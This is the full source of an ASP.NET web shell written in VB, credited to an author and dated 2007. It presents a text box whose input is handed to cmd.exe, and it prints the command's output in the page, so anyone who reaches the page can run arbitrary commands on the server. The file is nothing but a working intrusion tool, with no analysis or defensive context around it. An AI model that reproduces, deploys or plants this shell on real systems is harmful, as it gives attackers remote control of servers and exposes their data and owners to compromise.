<%@ Page Language="VB" %>
<%
	'Ferruh Mavituna
	'13/08/2007
%>
<style>
	body{font:Verdana}
	input{width:500px}
</style>
<form method="post" action="">
	<input type="text" name="cmd" /> <input type="submit" style="width:100px" value="Run" />
</form>

<%
	'System.Diagnostics.Process.Start("calc.exe")

	Dim cmd AS String = Request.Form("cmd")
	If cmd Is Nothing ORElse cmd IS String.Empty Then Response.End



	Dim pr As New System.Diagnostics.Process()

	pr.StartInfo.FileName = Server.Mappath("cmd.exe")
	pr.StartInfo.Arguments = "/c" & cmd
	pr.StartInfo.UseShellExecute = False
	pr.StartInfo.RedirectStandardOutput = True
	pr.StartInfo.RedirectStandardError = True

	pr.Start()

	Response.Write("<strong>" & Server.HTMLEncode(cmd) & "</strong>")
	Response.Write("<pre>" & Server.HTMLEncode(pr.StandardOutput.ReadToEnd) & "</pre>")
%>

